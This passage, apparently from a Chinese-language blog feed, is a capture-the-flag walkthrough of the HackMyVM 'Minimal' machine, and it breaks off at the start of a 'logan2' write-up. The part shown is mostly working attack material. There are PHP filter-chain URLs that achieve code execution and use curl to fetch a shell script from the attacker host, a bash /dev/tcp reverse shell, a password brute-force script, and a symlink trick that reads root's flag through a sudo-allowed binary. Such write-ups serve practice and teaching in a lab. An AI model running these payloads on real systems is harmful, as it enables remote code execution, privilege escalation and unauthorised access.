F8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=curl 192.168.205.141/shell.sh -o /tmp/a.sh
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=chmod +x /tmp/a.sh
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=bash%20/tmp/a.sh


‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat shell.sh
bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1                                   
```

ÊàêÂäüÂºπÂõû

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.135] 44534
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
www-data@minimal:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@minimal:/var/www/html$ sudo -l
Matching Defaults entries for www-data on minimal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on minimal:
    (root) NOPASSWD: /opt/quiz/shop
www-data@minimal:/var/www/html$ ls -la /opt/quiz/shop
-rwxrwxr-x 1 root root 16632 Nov  5  2023 /opt/quiz/shop

```

ËÉΩ`ËØªÂèñ„ÄÅÊâßË°å`Ôºå‰∏çËÉΩ‰øÆÊîπ(√óÔπè√ó)„ÄÇÊàë‰ª¨ÊääÊñá‰ª∂ÊãñÂéªÊú¨Âú∞Áî®**IDA**ÁúãÁúã

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdi
  _DWORD v5[4]; // [rsp+10h] [rbp-20h] BYREF
  char *v6; // [rsp+20h] [rbp-10h]
  char *s; // [rsp+28h] [rbp-8h]

  strcpy((char *)v5, 'results.txt');
  s = 'Hey guys, I have prepared this little program to find out how much you know about me, since I have been your admin'
      'istrator for 2 years.';
  v6 = 'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash';
  puts(
    'Hey guys, I have prepared this little program to find out how much you know about me, since I have been your adminis'
    'trator for 2 years.');
  puts(
    'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash');
  v5[3] = question_1(
            'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you d'
            'on't, you win trash');
  v5[3] += question_2(
             'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you '
             'don't, you win trash');
  v5[3] += question_3(
             'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you '
             'don't, you win trash');
  v3 = (__int64)v5;
  writeResults(v5, v5[3]);
  if ( v5[3] == 3 )
  {
    v3 = 3LL;
    print_prize(3LL);
  }
  if ( foo == 85 )
    wait_what(v3);
  return 0;
}
```

‰∏ªË¶ÅÊòØÂÆûÁé∞‰∫ÜÔºåËÆ©‰Ω†ÂõûÁ≠î3‰∏™ÈóÆÈ¢òÔºåÂ¶ÇÊûúÂõûÁ≠îÊ≠£Á°Æ‰∫ÜÔºåÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∏™Ê≥∞Ëø™ÁÜä„ÄÇÊàë‰ª¨Â∞ùËØïËé∑Âèñ‰∏Ä‰∏ãÈóÆÈ¢òÁöÑÁ≠îÊ°à

![image](https://github.com/user-attachments/assets/e6f1496e-80f6-4b48-97ed-976913a92103)

question_1ÁöÑÁ≠îÊ°àÊòØ`linux`

![image](https://github.com/user-attachments/assets/e17ea303-2bfe-45bc-aec3-3e29dffd0867)

question_2ÁöÑÁ≠îÊ°àÊòØ`gfhts ufshfpjx`

![image](https://github.com/user-attachments/assets/5f0b1612-dbd7-48cb-9bcc-dd7e41076d35)

question_3ÁöÑÁ≠îÊ°àÊòØ`hpok&amp;qorn&amp;vjsaohu`

![image](https://github.com/user-attachments/assets/3bdb6f71-68f0-4c42-8288-f7ec5337f1b4)

Á¨¨2ÂíåÁ¨¨3‰∏™ÊòØÈîôÁöÑÔºåÂèØËÉΩÊòØÈÄöËøá‰∫ÜÂä†ÂØÜÔºå‰ΩÜÊòØÊàëÊ≤°ÊúâÁ≥ªÁªüÁöÑÂ≠¶ËøáÂä†ÂØÜÁÆóÊ≥ïÂíåÈÄÜÂêëÔºåÊâÄ‰ª•Âè™ÂèØ‰ª•ÊÖ¢ÊÖ¢ËØï‰∫Ü

ÂÖàÊúâÊî∂Ëé∑ÁöÑÊòØÁ¨¨3‰∏™ÔºåÊòØ‰ΩøÁî®‰∫Ü**XOR**ÔºåÊàëÈÄöËøá[cyberchef](https://cyberchef.org/)Êö¥ÂäõÁ†¥Ëß£Ëé∑Âæó‰∫ÜÂá†‰∏™ÂÉèÂØÜÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤

![image](https://github.com/user-attachments/assets/47f3df6a-6afd-47c9-8e17-d1001ec2e98b)

ÊàëÈÄöËøáÊèêÊùÉËé∑ÂæóÁöÑÂ≠óÂÖ∏Ë°®

```bash
www-data@minimal:/tmp$ awk -F ': ' '{print $2}' tmp2 
iqnj'pnso'wkr`nit
jrmi$smpl$thqcmjw
kslh%rlqm%uipblkv
ltko'ukvj'rnweklq
mujn#tjwk#sovdjmp
nvim with plugins
owhl!vhui!qmtfhor
`xgc.ygzf.~b{ig`}
ayfb/xf{g/czhfa|
bzea,{exd,|`ykeb
c{d`-zdye-}axjdc~
d|cg*}c~b*zfmcdy
e}bf+|bc+{g~lbex
f~ae(a|`(xd}oaf{
g`d)~`}a)ye|n`gz
x`{6ab~6fzcqxe
ya~z7`~c7g{bp~yd
zb}y4c}`|4dxas}zg
{c|x5b|a}5ey`r|{f
|d{2e{fz2b~gu{|a
}ez~3dzg{3cftz}`
~fy}0gydx0`|ewy~c
gx|1fxey1a}dvxb
phws&gt;iwjv&gt;nrkywpm
qivr?hvkw?osjxvql
rjuq&lt;kuht&lt;lpi{uro
sktp=jtiu=mqhztsn
tlsw:msnr:jvo}sti
umrv;lros;kwn|ruh
vnqu8oqlp8htmqvk
wopt9npmq9iul~pwj
```

ÂÜô‰∫Ü‰∏™Â∞èËÑöÊú¨Ë∑ë‰∏Ä‰∏ãÔºàAIËæÖÂä©Ôºâ

```bash
#!/bin/bash

password_file='/tmp/tmp2'

while IFS= read -r password; do
  echo 'Trying password: $password'
  
  echo -e '$password\n' | sudo /opt/quiz/shop &gt; /tmp/output.txt
  
  if grep -q 'Correct!!' /tmp/output.txt; then
    echo 'Password found: $password'
    break
  fi
done &lt; '$password_file'
```

ÊâßË°å

```bash
www-data@minimal:/tmp$ bash b.sh 
Trying password: iqnj'pnso'wkr`nit
Trying password: jrmi$smpl$thqcmjw
Trying password: kslh%rlqm%uipblkv
Trying password: ltko'ukvj'rnweklq
Trying password: mujn#tjwk#sovdjmp
Trying password: nvim with plugins
Password found: nvim with plugins

```

Á¨¨‰∏â‰∏™Á≠îÊ°àÊòØÔºö`nvim with plugins`

Á¨¨‰∫å‰∏™ÁöÑÁ≠îÊ°àÔºåÁªÜÁªÜÂìÅ‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™'ÁßòÂØÜ'(Á¨¨‰∏â‰∏™‰πüÂèØ‰ª•ÈÄöËøáËøôÁßçÊñπÂºèËé∑ÂæóÂä†ÂØÜÁöÑÊñπÊ≥ï)
![image](https://github.com/user-attachments/assets/3903a8b9-2360-4ed3-b421-052babc11356)

ÂáØÊííÔºÅÔºÅÔºÅ

![image](https://github.com/user-attachments/assets/b6e01404-1abc-485d-b4be-18726c675c3d)

ÊâÄ‰ª•Á¨¨‰∫åÈ¢òÁöÑÁ≠îÊ°àÊòØÔºö`bacon pancakes`

```bash
www-data@minimal:/opt/quiz$ sudo /opt/quiz/shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
linux
Correct!!
What is my favorite food?
bacon pancakes
Correct!!
What is my favorite text editor?
nvim with plugins
Correct!!
User name: 
Saving results .
HURRAY YOU HAVE FOUND ME
 _________________________________________________________
|\=========================================================\
||                                                         |
||        _        __        ___        __        _        |
||       ; `-.__.-'. `-.__.-'. .`-.__.-' .`-.__.-' :       |
||     _.'. . . . . . . . .,,,,,,,. . . . . . . . .`._     |
||   .'. . . . . . . . ,a@@@@@@@@@@@a, . . . . . . . .`.   |
||   `. . . . ,a@@@@@a@@@a@@@@@@@@@a@@@a@@@@@a, . . . ,'   |
||     ) . . a@@@@@@a@@@@@a@@@@@@@a@@@@@a@@@@@@a . . (     |
||   ,' . . .@@@%%%a@@@@@@@@@@@@@@@@@@@@@a%%%@@@  . . `.   |
||   `.. . . @@@%%a@@@@@@''@@@@@@@''@@@@@@a%%@@@ . . .,'   |
||     ). . . '@@a@@@@@@@@@SSSSSSS@@@@@@@@@a@@' . . .(     |
||   ,'. . . . . `@@@@@@@@SSS, ,SSS@@@@@@@@' . . . . .`.   |
||   `. . . . . . `@@@@@@@`SSS:SSS'@@@@@@@' . . . . . ,'   |
||     ) . . . . . `@@@@@@@sssssss@@@@@@@' . . . . . (     |
||   ,' . . . . . ,a@@a@@@@@@@@@@@@@@@a@@a, . . . . . `.   |
||   `.. . . . .a@@@a@@@@@a@@@a@@@a@@@@@a@@@a. . . . .,'   |
||     ). . . .a@@@@@a@@@@@@@@@@@@@@@@@a@@@@@a. . . .(     |
||   ,'. . . . @@@@@@a@@@@'   '   `@@@@a@@@@@@ . . . .`.   |
||   `. . . . .@@@@@@@aaaa,       ,aaaa@@@@@@@  . . . ,'   |
||     ) . . . `@@@@@@@@@@@@a, ,a@@@@@@@@@@@@' . . . (     |
||   ,' . . . . .`@@@@@@@@@@a@a@a@@@@@@@@@@'. . . . . `.   |
||   `;;;;;;;;;;;;aaaaaaaaaa@@@@@aaaaaaaaaa;;;;;;;;;;;;'   |
||     );;;;;;;,mMMMMMMMm@@@@@@@@@@@mMMMMMMMm,;;;;;;;(     |
||   ,;;;;;;;;a@%#%%#%%#%Mm@@@@@@@mM%#%%#%%#%@a;;;;;;;;,   |
||   `;;;;;;;;@@%%%%%%%%%%M@@';'@@M%%%%%%%%%%@@;;;;;;;;'   |
||     );;;;;;`@a%%%%%%%%mM';;;;;'Mm%%%%%%%%a@';;;;;;(     |
||   ,;;;;;;;;;;'@@@@@@@@';;;;;;;;;'@@@@@@@@';;;;;;;;;;,   |
||   `;;;;;;;;;;;;'''''';;;;;;;;;;;;;'''''';;;;;;;;;;;;'   |
||     );;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-Catalyst(     |
||     `:;;;:-~~~-:;;:-~~~-:;;;;;:-~~~-:;;:,-~~~-:;;;:'    |
||       ~~~       ~~        ~~~        ~~        ~~~      |
||                     .=============.                     |
||                     |   Mr. Bear  :                     |
||                     `-------------'                     |
\|_________________________________________________________|


And now what??
```

Êù•‰πã‰∏çÊòìÁöÑÊ≥∞Ëø™ÁÜäÔºåÁÑ∂ÂêéÂÜçÁúã‰∏ã**IDA**Ëøô‰∏™Ê≥∞Ëø™ÁÜäÊÄé‰πàÊù•ÁöÑ

![image](https://github.com/user-attachments/assets/979a41d4-5417-4482-a112-f0321c3c3c3c)

![image](https://github.com/user-attachments/assets/11520f4a-cb3a-4bd6-b69d-ddc0c742cdaa)

ÊòØÊü•Áúã‰∫Ü`prize.txt`Êñá‰ª∂ÔºåÈÇ£Â∞±ÁÆÄÂçï‰∫ÜÔºåÂàõÂª∫‰∏Ä‰∏™**ËΩØÈìæÊé•**Â∞±Â•Ω‰∫Ü

```bash
www-data@minimal:/opt/quiz$ ln -s prize.txt /root/root.txt
ln: failed to create symbolic link '/root/root.txt': Permission denied
```

ËõôË∂£ÔºåÊ≤°ÊùÉÈôêÔºåÁ≠âÊàëÂõûÊÉ≥‰∫Ü‰∏Ä‰∏ãÔºåÂ•ΩÂÉèË¶ÅÂéªÂÆ∂ÁõÆÂΩïÔºå‰πãÂâçÁúãÁæ§‰∏ª`ll04567`ÈÉΩÂèØ‰ª•ÂÆûÁé∞ÔºåÂÜçËØïËØï

```bash
www-data@minimal:/var/www/html$ ln -s /root/root.txt prize.txt 
www-data@minimal:/var/www/html$ ls -al
total 64
drwxr-xr-x 4 www-data www-data 4096 Jan 14 08:56 .
drwxr-xr-x 3 root     root     4096 Nov  1  2023 ..
-rw-rw-r-- 1 www-data www-data 2964 Nov  1  2023 admin.php
-rw-rw-r-- 1 www-data www-data  892 Nov  1  2023 buy.php
-rw-r--r-- 1 www-data www-data  355 Nov  1  2023 config.php
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 imgs
-rw-r--r-- 1 www-data www-data 2601 Nov  1  2023 index.php
-rw-r--r-- 1 www-data www-data 1836 Nov  1  2023 login.php
-rw-r--r-- 1 www-data www-data  321 Nov  1  2023 logout.php
lrwxrwxrwx 1 www-data www-data   14 Jan 14 08:56 prize.txt -&gt; /root/root.txt
-rw-r--r-- 1 www-data www-data 2221 Nov  1  2023 register.php
-rw-rw-r-- 1 www-data www-data 3621 Nov  1  2023 reset_pass.php
-rw-r--r-- 1 www-data www-data  111 Nov  1  2023 restricted.php
-rw-r--r-- 1 root     root       18 Jan 14 07:58 results.txt
-rw-r--r-- 1 www-data www-data   12 Nov  1  2023 robots.txt
-rw-rw-r-- 1 www-data www-data 2549 Nov  1  2023 shop_cart.php
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 styles
www-data@minimal:/var/www/html$ sudo /opt/quiz/shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
linux
Correct!!
What is my favorite food?
bacon pancakes
Correct!!
What is my favorite text editor?
nvim with plugins
Correct!!
User name: 
Saving results .
HMV{xxxxxxxxxxxxx} 

```

Ë°å‰∫ÜÔºå‰∏ãÁè≠

![006mowZngy1gd6j0zxr0tg30as0bctww](assets/006mowZngy1gd6j0zxr0tg30as0bctww-20250114171159-n4ev1fr.gif)

# 5.ÂêéËØù

ÂéªÁúã‰∫ÜÂÖ∂‰ªñÂ§ß‰Ω¨ÁöÑ[wp](http://162.14.82.114/index.php/574/04/16/2024/)ÔºåÂèëÁé∞ËøòÂèØ‰ª•‰ΩøÁî®**ÊûÑÈÄ† ROP Èìæ**ÁöÑÊñπÂºèÊèêÊùÉÔºåÊÑüÂÖ¥Ë∂£ÁöÑÂèØ‰ª•ÂéªÁúã`HGBE`Â§ß‰Ω¨ÁöÑ[wp](http://162.14.82.114/index.php/574/04/16/2024/)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Minimal.html</guid><pubDate>Fri, 27 Jun 2025 09:33:23 +0000</pubDate></item><item><title>hmv_logan2</title><link>https://7r1UMPHK.github.io/post/hmv_logan2.html</link><description># hmv_logan2

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.144
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
Nmap scan report for 192.168.205.144
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
3000/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request')%r(GetRequest,1000,'HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n&lt;!
SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'theme-\'&gt;\n&lt;head\x
SF:20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;meta\x20name=\'v
SF:iewport\'\x20content=\'width=device-width,\x20initial-scale=1\'&gt;\n\t&lt;me
SF:ta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edge\'&gt;\n\t&lt;title&gt;
SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link
SF:\x20rel=\'manifest\'\x20href=\'/manifest\.json\'\x20crossorigin=\'use-c
SF:redentials\'&gt;\n\t&lt;meta\x20name=\'theme-color\'\x20content=\'#6cc644\'&gt;\
SF:n\t&lt;meta\x20name=\'author\'\x20content=\'Gitea\x20-\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea\'\x20/&gt;\n\t&lt;meta\x20name=\'description\'\x20conten
SF:t=\'Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
SF:nless')%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request')%r(HTTPOptions,1000,'HTTP/1\.0\x20404\x20Not\x20Found\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'the
SF:me-\'&gt;\n&lt;head\x20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;m
SF:eta\x20name=\'viewport\'\x20content=\'width=device-width,\x20initial-sc
SF:ale=1\'&gt;\n\t&lt;meta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edg
SF:e\'&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\'manifest\'\x20hre
SF:f=\'/manifest\.json\'\x20crossorigin=\'use-credentials\'&gt;\n\t&lt;meta\x20n
